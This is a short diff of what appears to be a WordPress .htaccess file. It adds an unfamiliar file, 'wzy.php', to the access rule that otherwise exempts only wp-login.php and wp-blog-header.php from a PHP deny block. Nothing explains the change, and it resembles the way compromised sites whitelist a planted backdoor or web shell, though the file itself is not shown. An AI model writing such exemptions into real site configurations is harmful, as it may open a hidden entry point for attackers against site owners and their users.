@@ -10,7 +10,7 @@ RewriteRule . index.php [L]
 Order Allow,Deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(wp-login.php|wp-blog-header.php|)$">
+<FilesMatch "^(wp-login.php|wp-blog-header.php|wzy.php)$">
 Order Allow,Deny
 Allow from all
 </FilesMatch>
